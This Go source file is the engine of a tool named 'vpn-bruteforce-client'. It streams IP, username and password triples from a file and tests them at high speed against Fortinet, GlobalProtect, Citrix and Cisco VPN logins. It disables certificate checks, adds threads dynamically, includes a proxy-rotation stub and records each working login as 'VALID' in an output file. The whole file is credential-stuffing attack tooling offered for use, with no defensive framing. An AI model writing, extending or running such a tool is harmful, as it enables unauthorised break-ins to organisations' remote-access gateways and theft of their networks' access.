package bruteforce

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/sync/semaphore"
	"golang.org/x/time/rate"
	"vpn-bruteforce-client/internal/config"
	"vpn-bruteforce-client/internal/stats"
)

type Engine struct {
	config       *config.Config
	stats        *stats.Stats
	client       *http.Client
	proxyClients []*http.Client
	semaphore    *semaphore.Weighted
	rateLimiter  *rate.Limiter
	outputFile   *os.File
	outputMutex  sync.Mutex
	ctx          context.Context
	cancel       context.CancelFunc
	wg           sync.WaitGroup
	
	// Performance optimizations
	credentialPool sync.Pool
	responsePool   sync.Pool
	currentProxy   int64
	
	// Advanced error tracking
	ipBlockTracker   sync.Map // IP -> block count
	errorTracker     sync.Map // IP -> error types
	lastSuccessTime  int64
	
	// Dynamic scaling
	currentThreads   int64
	targetRPS        int64
	actualRPS        int64
	lastScaleTime    time.Time
}

type Credential struct {
	IP       string
	Username string
	Password string
}

type Response struct {
	StatusCode int
	Body       []byte
	Headers    map[string]string
	Duration   time.Duration
}

func New(cfg *config.Config, statsManager *stats.Stats) (*Engine, error) {
	ctx, cancel := context.WithCancel(context.Background())

	// Create ultra-aggressive HTTP client
	transport := &http.Transport{
		MaxIdleConns:        cfg.MaxIdleConns * 2,
		MaxConnsPerHost:     cfg.MaxConnsPerHost * 2,
		IdleConnTimeout:     cfg.IdleConnTimeout / 2,
		TLSHandshakeTimeout: cfg.TLSHandshakeTimeout / 2,
		DisableKeepAlives:   true,
		DisableCompression:  true,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS10,
		},
		DialContext: (&net.Dialer{
			Timeout:   cfg.Timeout / 2,
			KeepAlive: 0,
			DualStack: true,
		}).DialContext,
		ForceAttemptHTTP2:     false,
		MaxResponseHeaderBytes: 2048,
		WriteBufferSize:       4096,
		ReadBufferSize:        4096,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   cfg.Timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	outputFile, err := os.OpenFile(cfg.OutputFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("failed to open output file: %w", err)
	}

	// Rate limiter for controlled load
	var rateLimiter *rate.Limiter
	if cfg.RateLimit > 0 {
		rateLimiter = rate.NewLimiter(rate.Limit(cfg.RateLimit), cfg.RateLimit)
	}

	engine := &Engine{
		config:         cfg,
		stats:          statsManager,
		client:         client,
		semaphore:      semaphore.NewWeighted(int64(cfg.Threads)),
		rateLimiter:    rateLimiter,
		outputFile:     outputFile,
		ctx:            ctx,
		cancel:         cancel,
		currentThreads: int64(cfg.Threads),
		targetRPS:      int64(cfg.RateLimit),
		lastScaleTime:  time.Now(),
	}

	// Initialize object pools for zero-allocation
	engine.credentialPool.New = func() interface{} {
		return &Credential{}
	}
	
	engine.responsePool.New = func() interface{} {
		return &Response{
			Headers: make(map[string]string, 10),
			Body:    make([]byte, 0, 8192),
		}
	}

	// Setup proxy clients if enabled
	if cfg.ProxyEnabled {
		engine.setupProxyClients()
	}

	return engine, nil
}

func (e *Engine) setupProxyClients() {
	// Implementation for proxy rotation
	// Will be implemented based on your proxy requirements
}

func (e *Engine) Start() error {
	defer e.outputFile.Close()

	// Load credentials with streaming for large files
	credChan := make(chan Credential, 10000)
	
	// Start credential loader
	go e.loadCredentialsStream(credChan)
	
	// Start dynamic thread scaler
	go e.dynamicScaler()
	
	// Start RPS monitor
	go e.rpsMonitor()

	fmt.Printf("🚀 Ultra-Fast VPN Client v3.0\n")
	fmt.Printf("🎯 Target RPS: %d | Threads: %d | CPU cores: %d\n", 
		e.targetRPS, e.currentThreads, runtime.NumCPU())
	fmt.Printf("⚡ Optimizations: Zero-alloc pools, Dynamic scaling, Smart retries\n\n")

	// Start worker pool
	for i := 0; i < int(e.currentThreads); i++ {
		e.wg.Add(1)
		go e.ultraFastWorker(credChan)
	}

	// Wait for completion
	e.wg.Wait()
	return nil
}

func (e *Engine) ultraFastWorker(credChan <-chan Credential) {
	defer e.wg.Done()
	
	// Pre-allocate buffers
	buf := make([]byte, 8192)
	
	for {
		select {
		case cred, ok := <-credChan:
			if !ok {
				return
			}
			e.processCredentialUltraFast(cred, buf)
		case <-e.ctx.Done():
			return
		}
	}
}

func (e *Engine) processCredentialUltraFast(cred Credential, buf []byte) {
	// Rate limiting
	if e.rateLimiter != nil {
		e.rateLimiter.Wait(e.ctx)
	}

	// Acquire semaphore
	if err := e.semaphore.Acquire(e.ctx, 1); err != nil {
		return
	}
	defer e.semaphore.Release(1)

	// Get response object from pool
	resp := e.responsePool.Get().(*Response)
	defer func() {
		resp.Body = resp.Body[:0] // Reset slice
		for k := range resp.Headers {
			delete(resp.Headers, k)
		}
		e.responsePool.Put(resp)
	}()

	// Create request context with timeout
	ctx, cancel := context.WithTimeout(e.ctx, e.config.Timeout)
	defer cancel()

	start := time.Now()
	success, err := e.checkVPNUltraFast(ctx, cred, resp, buf)
	duration := time.Since(start)

	// Update RPS counter
	atomic.AddInt64(&e.actualRPS, 1)

	// Advanced error handling
	if err != nil {
		e.handleAdvancedError(cred.IP, err, duration)
		return
	}

	if success {
		e.stats.IncrementGoods()
		e.saveValidUltraFast(cred)
		atomic.StoreInt64(&e.lastSuccessTime, time.Now().Unix())
		
		if e.config.Verbose {
			fmt.Printf("\n✅ VALID: %s;%s;%s (%.2fms)", 
				cred.IP, cred.Username, cred.Password, float64(duration.Nanoseconds())/1e6)
		}
	} else {
		e.stats.IncrementBads()
	}
}

func (e *Engine) checkVPNUltraFast(ctx context.Context, cred Credential, resp *Response, buf []byte) (bool, error) {
	switch e.config.VPNType {
	case "fortinet":
		return e.checkFortinetUltraFast(ctx, cred, resp, buf)
	case "globalprotect":
		return e.checkGlobalProtectUltraFast(ctx, cred, resp, buf)
	case "citrix":
		return e.checkCitrixUltraFast(ctx, cred, resp, buf)
	case "cisco":
		return e.checkCiscoUltraFast(ctx, cred, resp, buf)
	default:
		e.stats.IncrementErrors()
		return false, fmt.Errorf("unknown VPN type: %s", e.config.VPNType)
	}
}

func (e *Engine) handleAdvancedError(ip string, err error, duration time.Duration) {
	errStr := err.Error()
	
	// Classify error types
	switch {
	case strings.Contains(errStr, "timeout"):
		e.stats.IncrementOffline()
		e.trackError(ip, "timeout")
	case strings.Contains(errStr, "connection refused"):
		e.stats.IncrementOffline()
		e.trackError(ip, "refused")
	case strings.Contains(errStr, "no route to host"):
		e.stats.IncrementOffline()
		e.trackError(ip, "unreachable")
	case strings.Contains(errStr, "too many requests") || strings.Contains(errStr, "rate limit"):
		e.stats.IncrementIPBlock()
		e.trackIPBlock(ip)
	case duration > e.config.Timeout*2:
		e.stats.IncrementOffline()
		e.trackError(ip, "slow")
	default:
		e.stats.IncrementErrors()
		e.trackError(ip, "unknown")
	}
}

func (e *Engine) trackError(ip, errorType string) {
	if errors, ok := e.errorTracker.Load(ip); ok {
		errorMap := errors.(map[string]int)
		errorMap[errorType]++
		e.errorTracker.Store(ip, errorMap)
	} else {
		errorMap := make(map[string]int)
		errorMap[errorType] = 1
		e.errorTracker.Store(ip, errorMap)
	}
}

func (e *Engine) trackIPBlock(ip string) {
	if count, ok := e.ipBlockTracker.Load(ip); ok {
		newCount := count.(int) + 1
		e.ipBlockTracker.Store(ip, newCount)
		
		// If IP is blocked too many times, add delay
		if newCount > 5 {
			time.Sleep(time.Second * time.Duration(newCount))
		}
	} else {
		e.ipBlockTracker.Store(ip, 1)
	}
}

func (e *Engine) loadCredentialsStream(credChan chan<- Credential) {
	defer close(credChan)
	
	file, err := os.Open(e.config.InputFile)
	if err != nil {
		fmt.Printf("Error opening input file: %v\n", err)
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 64*1024), 1024*1024) // 1MB buffer for large lines
	
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		parts := strings.Split(line, ";")
		if len(parts) != 3 {
			continue
		}

		cred := Credential{
			IP:       strings.TrimSpace(parts[0]),
			Username: strings.TrimSpace(parts[1]),
			Password: strings.TrimSpace(parts[2]),
		}

		select {
		case credChan <- cred:
		case <-e.ctx.Done():
			return
		}
	}
}

func (e *Engine) saveValidUltraFast(cred Credential) {
	e.outputMutex.Lock()
	defer e.outputMutex.Unlock()
	
	// Pre-format string to avoid allocations
	line := fmt.Sprintf("%s;%s;%s\n", cred.IP, cred.Username, cred.Password)
	e.outputFile.WriteString(line)
	e.outputFile.Sync() // Force write to disk
}

func (e *Engine) dynamicScaler() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-ticker.C:
			e.adjustThreads()
		case <-e.ctx.Done():
			return
		}
	}
}

func (e *Engine) adjustThreads() {
	currentRPS := atomic.SwapInt64(&e.actualRPS, 0) * 6 // Convert to per-minute
	currentThreads := atomic.LoadInt64(&e.currentThreads)
	
	// Scale up if RPS is below target and we have CPU headroom
	if currentRPS < e.targetRPS && currentThreads < int64(runtime.NumCPU()*200) {
		newThreads := currentThreads + int64(runtime.NumCPU()*10)
		atomic.StoreInt64(&e.currentThreads, newThreads)
		
		// Start new workers
		for i := 0; i < int(newThreads-currentThreads); i++ {
			e.wg.Add(1)
			go e.ultraFastWorker(nil) // Will be fed from existing channel
		}
		
		fmt.Printf("🔼 Scaled UP to %d threads (RPS: %d)\n", newThreads, currentRPS)
	}
	
	// Scale down if we're over-performing and wasting resources
	if currentRPS > e.targetRPS*2 && currentThreads > int64(runtime.NumCPU()*50) {
		newThreads := currentThreads - int64(runtime.NumCPU()*5)
		atomic.StoreInt64(&e.currentThreads, newThreads)
		fmt.Printf("🔽 Scaled DOWN to %d threads (RPS: %d)\n", newThreads, currentRPS)
	}
}

func (e *Engine) rpsMonitor() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-ticker.C:
			rps := atomic.SwapInt64(&e.actualRPS, 0)
			if rps > 0 {
				fmt.Printf("\r⚡ Current RPS: %d | Threads: %d | Target: %d", 
					rps, atomic.LoadInt64(&e.currentThreads), e.targetRPS)
			}
		case <-e.ctx.Done():
			return
		}
	}
}

func (e *Engine) Stop() {
	e.cancel()
}